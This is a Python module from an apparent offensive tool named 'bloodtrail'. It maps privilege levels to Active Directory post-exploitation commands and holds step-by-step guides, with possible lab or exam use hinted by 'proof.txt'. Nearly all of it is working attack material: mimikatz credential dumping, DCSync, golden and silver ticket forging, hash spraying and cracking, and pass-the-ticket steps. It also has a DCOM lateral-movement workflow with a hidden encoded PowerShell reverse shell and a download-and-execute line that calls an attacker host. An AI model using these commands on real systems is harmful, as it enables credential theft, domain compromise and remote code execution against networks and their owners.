"""
Post-exploitation command mappings for bloodtrail.

Credential harvesting, ticket attacks, and privilege escalation workflows.
"""

from typing import Dict, List, Any, Optional


# Credential harvest commands organized by privilege level
# Shown after --pwn when user has local-admin access
POST_EXPLOITATION_COMMANDS: Dict[str, Dict[str, List[tuple]]] = {
    "local-admin": {
        "immediate": [
            ("mimikatz-privilege-debug", "Verify admin rights", "privilege::debug"),
            ("mimikatz-token-elevate", "Elevate to SYSTEM token", "token::elevate"),
        ],
        "credential_harvest": [
            ("mimikatz-sekurlsa-logonpasswords", "1. Active sessions - PRIORITY!", "sekurlsa::logonpasswords", "high"),
            ("mimikatz-sekurlsa-tickets-export", "2. Kerberos tickets", "sekurlsa::tickets /export", "high"),
            ("mimikatz-lsadump-sam", "3. Local account hashes", "lsadump::sam", "medium"),
            ("mimikatz-lsadump-secrets", "4. Service account passwords", "lsadump::secrets", "medium"),
            ("mimikatz-lsadump-cache", "5. Cached domain credentials", "lsadump::cache", "low"),
        ],
        "with_sessions": [
            ("mimikatz-sekurlsa-logonpasswords", "HIGH PRIORITY - DA sessions detected!", "sekurlsa::logonpasswords"),
            ("mimikatz-sekurlsa-tickets-export", "Export DA TGT for Pass-the-Ticket", "sekurlsa::tickets /export"),
        ],
        "with_harvested_hash": [
            ("mimikatz-overpass-the-hash", "Convert NTLM to Kerberos ticket", "sekurlsa::pth"),
            ("ad-silver-ticket-mimikatz-create", "Forge service ticket", "kerberos::golden /service"),
        ],
    },
    "domain-admin": {
        "remote_preferred": [
            ("ad-dcsync-impacket-secretsdump-user", "Remote DCSync (safer)", "secretsdump.py"),
            ("mimikatz-dcsync-all", "DCSync all accounts", "lsadump::dcsync /all"),
        ],
        "persistence": [
            ("ad-golden-ticket-mimikatz-create", "Golden Ticket for persistence", "kerberos::golden"),
        ],
        "on_dc": [
            ("ad-golden-ticket-lsa-dump-krbtgt", "Full NTDS extraction (on DC only)", "lsadump::lsa /patch"),
        ],
    },
    "user-level": {
        "limited": [
            ("mimikatz-kerberos-list", "View own Kerberos tickets", "kerberos::list"),
        ],
        "privesc_check": [
            ("winpeas", "Check for local privilege escalation", "winPEAS.exe"),
        ],
    },
}


# Educational tips for credential harvesting - what to look for and next steps
HARVEST_TIPS: Dict[str, Dict[str, List[str]]] = {
    "sekurlsa::logonpasswords": {
        "what_to_look_for": [
            "NTLM hash (32 hex chars) - usable for Pass-the-Hash",
            "Cleartext password - if wdigest enabled (older systems)",
            "Domain\\Username pairs - identify high-value accounts",
            "Multiple entries = multiple logged-in users (jackpot!)",
        ],
        "next_steps": [
            "Found DA hash? -> DCSync immediately: secretsdump.py",
            "Found service account? -> Check SPNs for Silver Ticket",
            "Found local admin? -> Spray hash: crackmapexec smb <targets> -H <hash>",
            "Cleartext password? -> Try password reuse on other accounts",
        ],
    },
    "sekurlsa::tickets": {
        "what_to_look_for": [
            "krbtgt tickets (TGT) - most valuable, reusable",
            "Service tickets (TGS) - limited to specific service",
            "Ticket expiration time - ensure not expired",
            "Encryption type - RC4 vs AES (AES = modern, stealthier)",
        ],
        "next_steps": [
            "Export TGT: sekurlsa::tickets /export",
            "Inject on attacker box: kerberos::ptt <ticket.kirbi>",
            "Use for lateral movement without knowing password",
            "DA TGT = domain-wide access via Kerberos auth",
        ],
    },
    "lsadump::sam": {
        "what_to_look_for": [
            "Local Administrator hash - often reused across machines!",
            "RID 500 = built-in Administrator (even if renamed)",
            "Other local accounts - may have weak passwords",
            "Compare hashes across machines for reuse",
        ],
        "next_steps": [
            "Crack: hashcat -m 1000 hash.txt rockyou.txt",
            "Spray: crackmapexec smb <targets> -H <hash> --local-auth",
            "Same hash on multiple machines = password reuse = pivot!",
            "Add to credential database for future spray attacks",
        ],
    },
    "lsadump::secrets": {
        "what_to_look_for": [
            "Service account passwords (often in cleartext!)",
            "DPAPI master keys - decrypt saved credentials",
            "Machine account password - rarely useful but document",
            "Scheduled task credentials - may be domain accounts",
        ],
        "next_steps": [
            "Service account found? -> Check if DA or high-privilege",
            "Use for lateral movement if service runs on other boxes",
            "Check SPNs: setspn -L <service_account>",
            "May enable Kerberoasting bypass (already have password)",
        ],
    },
    "lsadump::cache": {
        "what_to_look_for": [
            "DCC2 hashes - cached domain credentials",
            "Format: $DCC2$<iterations>$<username>$<hash>",
            "User accounts that logged in while DC unreachable",
            "May contain DA creds if DA logged in offline",
        ],
        "next_steps": [
            "Crack: hashcat -m 2100 dcc2.txt rockyou.txt",
            "DCC2 is SLOW to crack (~10x slower than NTLM)",
            "Prioritize high-value accounts (admin, service)",
            "Use rules: -r best64.rule for efficiency",
        ],
    },
    "overpass_the_hash": {
        "what_to_look_for": [
            "New cmd.exe window spawns with Kerberos context",
            "klist shows TGT for target user",
            "Can now use Kerberos auth (hostname required, not IP)",
        ],
        "next_steps": [
            "Access resources using hostname: dir \\\\DC01\\C$",
            "DO NOT use IP addresses (forces NTLM, bypasses ticket)",
            "Chain with other Kerberos attacks: Silver/Golden tickets",
        ],
    },
}


# Pass-the-Ticket workflow - step by step guide
PTT_WORKFLOW: Dict[str, Dict[str, Any]] = {
    "export": {
        "title": "1. EXPORT TICKETS",
        "command": 'mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"',
        "notes": [
            "Creates .kirbi files in current directory",
            "Look for *krbtgt*.kirbi files (TGTs) - HIGHEST PRIORITY",
            "TGT format: [session]-2-0-*-user@krbtgt-DOMAIN.kirbi",
        ],
    },
    "identify": {
        "title": "2. IDENTIFY VALUABLE TICKETS",
        "priority_order": [
            ("*krbtgt*.kirbi", "TGT - Can request ANY service ticket", "HIGHEST"),
            ("*cifs*.kirbi", "File share access to specific host", "HIGH"),
            ("*ldap*.kirbi", "LDAP access (enumeration)", "MEDIUM"),
            ("*http*.kirbi", "Web service access", "LOW"),
        ],
        "notes": [
            "User tickets (user@...) > Machine tickets (COMPUTER$@...)",
            "DA/admin user TGTs = domain-wide access",
        ],
    },
    "import_windows": {
        "title": "3a. IMPORT TICKET (Windows)",
        "commands": [
            ("Import", 'mimikatz.exe "kerberos::ptt <ticket.kirbi>" "exit"'),
            ("Verify", "klist"),
        ],
        "success_indicators": [
            "klist shows ticket for target user",
            "Server: krbtgt/DOMAIN (for TGT)",
        ],
    },
    "import_linux": {
        "title": "3b. IMPORT TICKET (Kali)",
        "commands": [
            ("Convert", "impacket-ticketConverter <ticket.kirbi> ticket.ccache"),
            ("Set env", "export KRB5CCNAME=$(pwd)/ticket.ccache"),
            ("Verify", "klist"),
        ],
        "notes": [
            "Must convert .kirbi (Windows) to .ccache (Linux)",
            "Use absolute path for KRB5CCNAME",
        ],
    },
    "capitalize": {
        "title": "4. USE THE TICKET",
        "critical_warning": "MUST use HOSTNAME not IP address!",
        "windows_commands": [
            ("List shares", "dir \\\\<TARGET>.domain.com\\C$"),
            ("Get flag", "type \\\\<TARGET>.domain.com\\C$\\Users\\Administrator\\Desktop\\proof.txt"),
            ("PsExec", "PsExec.exe \\\\<TARGET>.domain.com cmd.exe"),
        ],
        "linux_commands": [
            ("SMB access", "impacket-smbclient -k -no-pass <TARGET>.domain.com"),
            ("Shell", "impacket-psexec -k -no-pass <USER>@<TARGET>.domain.com"),
            ("Dump secrets", "impacket-secretsdump -k -no-pass <USER>@<TARGET>.domain.com"),
        ],
        "examples": {
            "correct": "dir \\\\DC01.corp.com\\C$  (Kerberos auth)",
            "wrong": "dir \\\\192.168.1.1\\C$  (Falls back to NTLM!)",
        },
    },
    "troubleshoot": {
        "title": "5. TROUBLESHOOTING",
        "issues": [
            {
                "problem": "klist shows no tickets after import",
                "causes": ["Wrong session", "Ticket expired", "Syntax error (use :: not :)"],
                "fix": "Re-export on target, check timestamp, verify path to .kirbi",
            },
            {
                "problem": "Access denied with valid ticket",
                "causes": ["Using IP instead of hostname", "Ticket for wrong service", "Expired"],
                "fix": "Use FQDN hostname, check klist expiry, export fresh ticket",
            },
            {
                "problem": "KDC_ERR_PREAUTH_REQUIRED",
                "causes": ["Ticket not injected", "Wrong domain context"],
                "fix": "Verify KRB5CCNAME path is absolute, domain matches ticket",
            },
        ],
    },
}


# DCOM Lateral Movement workflow (PowerShell-based, from compromised Windows host)
DCOM_WORKFLOW: Dict[str, Any] = {
    "description": "Fileless lateral movement via MMC20.Application DCOM object",
    "requirements": [
        "Must execute FROM a compromised Windows host",
        "Local admin on target machine",
        "RPC port 135 open on target",
    ],
    "step1_instantiate": {
        "title": "1. INSTANTIATE REMOTE DCOM OBJECT",
        "command": "$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','<TARGET_IP>'))",
        "note": "Replace <TARGET_IP> with target machine IP",
    },
    "step2_execute": {
        "title": "2. EXECUTE COMMAND",
        "examples": [
            {
                "name": "Simple command",
                "command": "$dcom.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c whoami > C:\\temp\\out.txt','7')",
            },
            {
                "name": "Reverse shell (PowerShell encoded)",
                "setup": "# First generate payload on Kali:\npython3 -c \"import base64; print(base64.b64encode(open('shell.ps1','rb').read()).decode())\"",
                "command": "$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'powershell -nop -w hidden -e <BASE64_PAYLOAD>','7')",
            },
            {
                "name": "Download & execute",
                "command": "$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'IEX(New-Object Net.WebClient).DownloadString(\"http://<KALI_IP>/shell.ps1\")','7')",
            },
        ],
    },
    "step3_verify": {
        "title": "3. VERIFY EXECUTION",
        "methods": [
            "Check listener for reverse shell connection",
            "RDP/WinRM to target and check output file",
            "Use tasklist | findstr <process> on target",
        ],
    },
    "troubleshooting": {
        "issues": [
            {
                "problem": "Access denied / RPC server unavailable",
                "fix": "Verify local admin rights, check port 135 is open, ensure DCOM is enabled",
            },
            {
                "problem": "Command executes but no shell",
                "fix": "Check firewall on target, use encoded payload, try different execution method",
            },
        ],
    },
}


# Argument acquisition hints - how to obtain critical placeholders
ARG_ACQUISITION: Dict[str, Dict[str, Any]] = {
    "<SID>": {
        "description": "Domain Security Identifier (without user RID)",
        "quick_commands": [
            "whoami /user  # Remove last segment after final hyphen",
            "Get-ADDomain | Select DomainSID  # PowerShell",
            "lookupsid.py 'DOMAIN/user:pass'@DC_IP  # Impacket",
        ],
        "example": "S-1-5-21-1987370270-658905905-1781884369",
        "common_mistake": "Don't include user RID (the -1105 at the end)",
    },
    "<KRBTGT_HASH>": {
        "description": "NTLM hash of krbtgt account (32 hex chars)",
        "quick_commands": [
            "secretsdump.py -just-dc-user krbtgt 'DOMAIN/DA:pass'@DC_IP",
            "mimikatz # lsadump::dcsync /domain:DOMAIN /user:krbtgt",
        ],
        "requires": "Domain Admin or DCSync rights",
        "example": "1693c6cefafffc7af11ef34d1c788f47",
    },
    "<DOMAIN>": {
        "description": "Domain FQDN (not NetBIOS)",
        "quick_commands": [
            "echo %userdnsdomain%  # Windows CMD",
            "$env:USERDNSDOMAIN  # PowerShell",
            "Get-ADDomain | Select DNSRoot  # PowerShell AD",
        ],
        "example": "corp.com",
        "common_mistake": "Use FQDN (corp.com) not NetBIOS (CORP)",
    },
    "<DC_IP>": {
        "description": "Domain Controller IP address",
        "quick_commands": [
            "nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN",
            "nltest /dclist:DOMAIN  # Windows",
            "echo %LOGONSERVER%  # Current DC",
        ],
        "example": "10.0.0.1",
    },
    "<SERVICE_HASH>": {
        "description": "NTLM hash of service account (for Silver Ticket)",
        "quick_commands": [
            "# Kerberoast then crack:",
            "GetUserSPNs.py -request 'DOMAIN/user:pass' -dc-ip DC_IP",
            "hashcat -m 13100 tgs.txt rockyou.txt",
            "# Or from LSASS if service logged in:",
            "sekurlsa::logonpasswords",
        ],
        "requires": "Any domain user (Kerberoast) or local admin (LSASS)",
    },
    "<TARGET_SPN>": {
        "description": "Service Principal Name (service/hostname)",
        "quick_commands": [
            "setspn -Q */<hostname>*  # Find SPNs on target",
            "setspn -L <service_account>  # List account's SPNs",
        ],
        "example": "cifs/files04.corp.com, http/web01.corp.com",
    },
}


def get_post_exploit_commands(
    privilege_level: str,
    category: Optional[str] = None
) -> List[tuple]:
    """
    Get post-exploitation commands for a given privilege level.

    Args:
        privilege_level: local-admin, domain-admin, or user-level
        category: Optional filter (immediate, credential_harvest, etc.)

    Returns:
        List of command tuples (id, description, command, [priority])
    """
    level_commands = POST_EXPLOITATION_COMMANDS.get(privilege_level, {})
    if category:
        return level_commands.get(category, [])
    # Return all commands for level
    all_commands = []
    for cat_commands in level_commands.values():
        all_commands.extend(cat_commands)
    return all_commands


def get_harvest_tips(module: str) -> Dict[str, List[str]]:
    """
    Get educational tips for a mimikatz module.

    Args:
        module: Mimikatz module name (e.g., sekurlsa::logonpasswords)

    Returns:
        Dict with 'what_to_look_for' and 'next_steps' lists
    """
    return HARVEST_TIPS.get(module, {"what_to_look_for": [], "next_steps": []})


def get_arg_acquisition(placeholder: str) -> Optional[Dict[str, Any]]:
    """
    Get acquisition hints for a command placeholder.

    Args:
        placeholder: Placeholder like <SID>, <KRBTGT_HASH>, etc.

    Returns:
        Dict with description, quick_commands, example, etc.
    """
    return ARG_ACQUISITION.get(placeholder)
